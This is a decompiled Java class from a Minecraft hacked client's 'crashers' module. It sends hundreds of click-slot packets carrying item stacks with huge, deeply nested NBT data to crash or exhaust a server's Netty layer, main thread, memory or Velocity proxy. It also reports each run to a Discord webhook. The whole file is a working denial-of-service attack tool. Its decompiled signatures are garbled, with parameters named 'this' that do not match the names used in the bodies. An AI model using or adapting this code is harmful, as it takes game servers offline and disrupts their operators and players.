package org.jon.magicclient.client.crashers;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.Arrays;
import java.util.List;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import net.minecraft.class_412;
import net.minecraft.class_442;
import net.minecraft.class_500;
import net.minecraft.class_639;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionType;
import org.jon.magicclient.client.utils.OptionUtil;

public class Magic1 implements Command {
   private boolean enabled = false;
   private final class_310 mc = class_310.method_1551();
   private final MessageHelper msgHelper = new MessageHelper();
   private final List<OptionUtil> options;

   public Magic1() {
      this.options = Arrays.asList(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Depth", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Netty1", "Netty2", "Main1", "Main2", "RamCpu", "Velocity"}), new OptionUtil("ThreadSleep", OptionType.INTEGER), new OptionUtil("ThreadLoop", OptionType.INTEGER));
      ((OptionUtil)this.options.get(0)).setValue(100);
      ((OptionUtil)this.options.get(1)).setValue(10);
      ((OptionUtil)this.options.get(2)).setValue(5);
      ((OptionUtil)this.options.get(3)).setValue("Netty1");
      ((OptionUtil)this.options.get(4)).setValue(0);
      ((OptionUtil)this.options.get(5)).setValue(1);
   }

   public void onMethod(String[] this) {
      System.out.println("Chain1.onMethod called with args: " + Arrays.toString(args));
      System.out.println("Current enabled state: " + this.enabled);
      int packets = Integer.parseInt(args[2]);
      int size = Integer.parseInt(args[3]);
      int depth = Integer.parseInt(args[4]);
      String type = args[5].toLowerCase();
      int threadSleep = args.length > 6 ? Integer.parseInt(args[6]) : 0;
      int threadLoop = args.length > 7 ? Integer.parseInt(args[7]) : 1;
      StringBuilder config = new StringBuilder();
      config.append("Packets=").append(packets).append(", Size=").append(size).append(", Depth=").append(depth).append(", Type=").append(type).append(", ThreadSleep=").append(threadSleep).append(", ThreadLoop=").append(threadLoop);
      DiscordWebhookSender.sendCrasherActivation("Chain1", config.toString());
      if (this.enabled) {
         System.out.println("Chain1 is already enabled, stopping first...");
         this.enabled = false;

         try {
            Thread.sleep(100L);
         } catch (InterruptedException var10) {
            Thread.currentThread().interrupt();
         }
      }

      System.out.println("Starting Chain1 with: packets=" + packets + ", size=" + size + ", depth=" + depth + ", type=" + type);
      this.enabled = true;
      if (type.equals("velocity")) {
         this.handleVelocityCrash(packets, size, depth, threadSleep, threadLoop);
      } else {
         (new Thread(() -> {
            boolean success = false;
            boolean var21 = false;

            label248: {
               label247: {
                  label267: {
                     label268: {
                        try {
                           var21 = true;
                           int loop = 0;

                           while(true) {
                              if (loop >= threadLoop || !this.enabled) {
                                 success = true;
                                 var21 = false;
                                 break;
                              }

                              if (this.mc.field_1724 == null || this.mc.method_1562() == null) {
                                 System.out.println("[Chain1] Player disconnected - stopping crash");
                                 this.msgHelper.sendMessage("§c[Chain1] Stopped - disconnected from server", true);
                                 this.enabled = false;
                                 DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), false);
                                 var21 = false;
                                 break label247;
                              }

                              if (loop > 0 && threadSleep > 0) {
                                 Thread.sleep((long)threadSleep);
                              }

                              this.msgHelper.sendMessage("§a[Chain1] Loop " + (loop + 1) + "/" + threadLoop + " starting...", true);
                              int tmp1$ = -1;
                              switch(type.hashCode()) {
                              case -1048914033:
                                 if (type.equals("netty1")) {
                                    tmp1$ = 0;
                                 }
                                 break;
                              case -1048914032:
                                 if (type.equals("netty2")) {
                                    tmp1$ = 2;
                                 }
                                 break;
                              case -938316598:
                                 if (type.equals("ramcpu")) {
                                    tmp1$ = 3;
                                 }
                                 break;
                              case 103657880:
                                 if (type.equals("main1")) {
                                    tmp1$ = 1;
                                 }
                              }

                              class_1799 stack;
                              switch(tmp1$) {
                              case 0:
                                 stack = this.getNettyStack1(size);
                                 break;
                              case 1:
                                 stack = this.getMainStack1(size, depth);
                                 break;
                              case 2:
                                 stack = this.getNettyStack2(size);
                                 break;
                              case 3:
                                 stack = this.getRamCpuStack(size, depth);
                                 break;
                              default:
                                 stack = this.getMainStack2(size);
                              }

                              if (this.mc.field_1724 == null || this.mc.method_1562() == null) {
                                 this.msgHelper.sendMessage("§c[Chain1] Not connected to server!", true);
                                 this.enabled = false;
                                 DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), false);
                                 var21 = false;
                                 break label267;
                              }

                              int sent = 0;

                              for(int i = 0; i < packets && this.enabled; ++i) {
                                 if (this.mc.field_1724 == null || this.mc.method_1562() == null) {
                                    System.out.println("[Chain1] Connection lost during packet sending - stopping");
                                    this.msgHelper.sendMessage("§c[Chain1] Stopped - connection lost", true);
                                    this.enabled = false;
                                    DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), false);
                                    var21 = false;
                                    break label248;
                                 }

                                 if (this.mc.method_1562() != null) {
                                    try {
                                       this.mc.method_1562().method_2883(new class_2813(0, 0, 20, 0, class_1713.field_7793, stack, new Int2ObjectOpenHashMap()));
                                       ++sent;
                                    } catch (Exception var22) {
                                    }
                                 }
                              }

                              this.msgHelper.sendMessage("§a[Chain1] Loop " + (loop + 1) + " sent " + sent + " packets", true);
                              ++loop;
                           }
                        } catch (Exception var23) {
                           this.msgHelper.sendMessage("§c[Chain1] Error: " + var23.getMessage(), true);
                           success = false;
                           var21 = false;
                           break label268;
                        } finally {
                           if (var21) {
                              this.enabled = false;
                              this.msgHelper.sendMessage("§a[Magic1] Attack finished!", true);
                              DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
                           }
                        }

                        this.enabled = false;
                        this.msgHelper.sendMessage("§a[Magic1] Attack finished!", true);
                        DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
                        return;
                     }

                     this.enabled = false;
                     this.msgHelper.sendMessage("§a[Chain1] Attack finished!", true);
                     DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
                     return;
                  }

                  this.enabled = false;
                  this.msgHelper.sendMessage("§a[Magic1] Attack finished!", true);
                  DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
                  return;
               }

               this.enabled = false;
               this.msgHelper.sendMessage("§a[Magic1] Attack finished!", true);
               DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
               return;
            }

            this.enabled = false;
            this.msgHelper.sendMessage("§a[Magic1] Attack finished!", true);
            DiscordWebhookSender.sendCrasherCompletion("Chain1", config.toString(), success);
         }, "Chain1-Thread")).start();
      }
   }

   private void handleVelocityCrash(int this, int packets, int size, int depth, int threadSleep) {
      class_310 client = class_310.method_1551();
      if (client.method_1558() == null) {
         this.msgHelper.sendMessage("§c[Chain1] Not connected to a server!", true);
         this.enabled = false;
      } else {
         String config = "Packets=" + packets + ", Size=" + size + ", Depth=" + depth + ", Type=velocity, ThreadSleep=" + threadSleep + ", ThreadLoop=" + threadLoop;
         DiscordWebhookSender.sendCrasherActivation("Chain1-Velocity", config);
         class_639 serverAddress = class_639.method_2950(client.method_1558().field_3761);
         (new Thread(() -> {
            boolean success = false;
            boolean var22 = false;

            label161: {
               try {
                  var22 = true;

                  for(int loop = 0; loop < threadLoop && this.enabled; ++loop) {
                     if (loop > 0 && threadSleep > 0) {
                        Thread.sleep((long)threadSleep);
                     }

                     this.msgHelper.sendMessage("§a[Chain1-Velocity] Reconnecting Loop " + (loop + 1) + "...", true);
                     client.execute(() -> {
                        if (client.field_1687 != null) {
                           client.field_1687.method_8525();
                        }

                        class_412.method_36877(new class_500(new class_442()), client, serverAddress, client.method_1558(), false);
                     });
                     long startTime = System.currentTimeMillis();

                     while(client.method_1562() == null && System.currentTimeMillis() - startTime < 2000L) {
                        Thread.sleep(10L);
                     }

                     if (client.method_1562() != null) {
                        this.msgHelper.sendMessage("§a[Chain1-Velocity] Sending packets during join phase...", true);
                        class_1799 stack = this.getRamCpuStack(size, depth);
                        int sent = 0;

                        for(int i = 0; i < packets && this.enabled; ++i) {
                           try {
                              client.method_1562().method_2883(new class_2813(0, 0, 20, 0, class_1713.field_7793, stack, new Int2ObjectOpenHashMap()));
                              ++sent;
                           } catch (Exception var23) {
                           }
                        }

                        this.msgHelper.sendMessage("§a[Chain1-Velocity] Sent " + sent + " packets to proxy", true);
                     }
                  }

                  success = true;
                  var22 = false;
                  break label161;
               } catch (Exception var24) {
                  this.msgHelper.sendMessage("§c[Chain1-Velocity] Error: " + var24.getMessage(), true);
                  success = false;
                  var22 = false;
               } finally {
                  if (var22) {
                     this.enabled = false;
                     this.msgHelper.sendMessage("§a[Magic1-Velocity] Attack finished!", true);
                     DiscordWebhookSender.sendCrasherCompletion("Chain1-Velocity", config, success);
                  }
               }

               this.enabled = false;
               this.msgHelper.sendMessage("§a[Chain1-Velocity] Attack finished!", true);
               DiscordWebhookSender.sendCrasherCompletion("Magic1-Velocity", config, success);
               return;
            }

            this.enabled = false;
            this.msgHelper.sendMessage("§a[Magic1-Velocity] Attack finished!", true);
            DiscordWebhookSender.sendCrasherCompletion("Magic1-Velocity", config, success);
         }, "Chain1-Velocity-Thread")).start();
      }
   }

   private class_1799 getRamCpuStack(int this, int size) {
      class_2487 tag = new class_2487();
      class_2487 blockEntityTag = new class_2487();
      class_2499 list = new class_2499();

      for(int i = 0; i < size; ++i) {
         class_2487 entry = new class_2487();
         class_2487 nested = entry;

         for(int j = 0; j < depth; ++j) {
            class_2487 next = new class_2487();
            next.method_10566("data" + j, new class_2487());
            nested.method_10566("node" + j, next);
            nested = next;
         }

         list.add(entry);
      }

      blockEntityTag.method_10566("Items", list);
      blockEntityTag.method_10582("id", "minecraft:chest");
      tag.method_10566("BlockEntityTag", blockEntityTag);
      class_1799 stack = new class_1799(class_1802.field_8106);
      stack.method_7980(tag);
      return stack;
   }

   private class_1799 getMainStack2(int this) {
      class_2487 blockEntityTag = new class_2487();
      class_2487 spawnerTag = new class_2487();
      class_2499 pigList = new class_2499();

      for(int i = 0; i < size; ++i) {
         pigList.add(new class_2487());
      }

      blockEntityTag.method_10566("pig", pigList);
      spawnerTag.method_10566("BlockEntityTag", blockEntityTag);
      class_1799 stack = new class_1799(class_1802.field_8849);
      stack.method_7980(spawnerTag);
      return stack;
   }

   private class_1799 getNettyStack2(int this) {
      class_2487 tag = new class_2487();
      class_2487 blockEntityTag = new class_2487();
      blockEntityTag.method_10582("id", "minecraft:Spawner");
      class_2499 beesList = new class_2499();
      class_2487 spawnerNbt = new class_2487();
      class_2487 spawnData = new class_2487();
      spawnData.method_10582("id", "minecraft:pig");
      class_2487 entity = new class_2487();
      entity.method_10582("id", "minecraft:pig");
      entity.method_10548("Health", 1000.0F);
      spawnData.method_10566("entity", entity);
      spawnerNbt.method_10566("SpawnData", spawnData);
      spawnerNbt.method_10575("Delay", (short)1);
      spawnerNbt.method_10575("MinSpawnDelay", (short)1);
      spawnerNbt.method_10575("MaxSpawnDelay", (short)2);
      spawnerNbt.method_10575("SpawnCount", (short)400);
      spawnerNbt.method_10575("MaxNearbyEntities", (short)600);
      spawnerNbt.method_10575("RequiredPlayerRange", (short)106);
      spawnerNbt.method_10575("SpawnRange", (short)400);
      blockEntityTag.method_10566("pig", beesList);
      tag.method_10566("BlockEntityTag", blockEntityTag);
      class_1799 stack = new class_1799(class_1802.field_8849);
      stack.method_7980(tag);
      return stack;
   }

   private class_1799 getNettyStack1(int this) {
      class_2487 compoundTag = new class_2487();
      class_2499 pigList = new class_2499();
      new class_2487();
      new class_2487();
      class_2487 spawnerNbt = new class_2487();
      class_2487 spawnData = new class_2487();
      spawnData.method_10582("id", "minecraft:pig");
      class_2487 entity = new class_2487();
      entity.method_10582("id", "minecraft:pig");
      entity.method_10548("Health", 10.0F);
      spawnData.method_10566("entity", entity);
      spawnerNbt.method_10566("SpawnData", spawnData);
      spawnerNbt.method_10575("Delay", (short)20);
      spawnerNbt.method_10575("MinSpawnDelay", (short)200);
      spawnerNbt.method_10575("MaxSpawnDelay", (short)800);
      spawnerNbt.method_10575("SpawnCount", (short)4);
      spawnerNbt.method_10575("MaxNearbyEntities", (short)6);
      spawnerNbt.method_10575("RequiredPlayerRange", (short)16);
      spawnerNbt.method_10575("SpawnRange", (short)4);
      compoundTag.method_10566("Pig", pigList);
      compoundTag.method_10582("id", "minecraft:spawner");
      class_1799 stack = new class_1799(class_1802.field_8849);
      stack.method_7980(compoundTag);
      return stack;
   }

   private class_1799 getMainStack1(int this, int size) {
      class_2487 compoundTag = new class_2487();
      class_2499 pigList = new class_2499();
      class_2487 pigTag = new class_2487();
      class_2487 entityData = new class_2487();
      class_2487 blockEntityTag = new class_2487();
      class_2487 spawnerTag = new class_2487();

      for(int i = 0; i < size; ++i) {
         class_2487 current = entityData;

         for(int j = 0; j < depth; ++j) {
            class_2487 next = new class_2487();
            next.method_10566("nested", new class_2487());
            current = next;
         }

         entityData.method_10566("deeplyNested", current);
         entityData.method_10582("id", "minecraft:pig");
         entityData.method_10548("Health", 10.0F);
         pigTag.method_10566("EntityData", entityData);
         pigList.add(pigTag);
      }

      compoundTag.method_10566("Pigs", pigList);
      compoundTag.method_10582("id", "minecraft:Spawner");
      class_1799 stack = new class_1799(class_1802.field_8849);
      blockEntityTag.method_10566("pig", pigList);
      spawnerTag.method_10566("BlockEntityTag", blockEntityTag);
      stack.method_7980(spawnerTag);
      stack.method_7980(compoundTag);
      return stack;
   }

   public String getName() {
      return "Chain1";
   }

   public boolean getEnabled() {
      return this.enabled;
   }

   public void setEnabled(boolean this) {
      this.enabled = bool;
   }

   public void onCommand(String[] this) {
      if (args.length < 5) {
         this.msgHelper.sendMessage("&7Usage: !chain1 <packets> <size> <depth> <type> [sleep] [loop]", true);
      } else {
         try {
            int packets = Integer.parseInt(args[1]);
            int size = Integer.parseInt(args[2]);
            int depth = Integer.parseInt(args[3]);
            String type = args[4].toLowerCase();
            int sleep = args.length > 5 ? Integer.parseInt(args[5]) : 0;
            int loop = args.length > 6 ? Integer.parseInt(args[6]) : 1;
            this.onMethod(new String[]{"", "", String.valueOf(packets), String.valueOf(size), String.valueOf(depth), type, String.valueOf(sleep), String.valueOf(loop)});
         } catch (NumberFormatException var9) {
            this.msgHelper.sendMessage("&cInvalid numbers provided!", true);
         }

      }
   }

   public String getArgsUsage() {
      return "<packets> <size> <depth> <type> [sleep] [loop]";
   }

   public String getDescription() {
      return "Chain1 crash";
   }

   public List<OptionUtil> getOptions() {
      return this.options;
   }

   public GuiCategory getCategory() {
      return GuiCategory.CRASHES;
   }
}
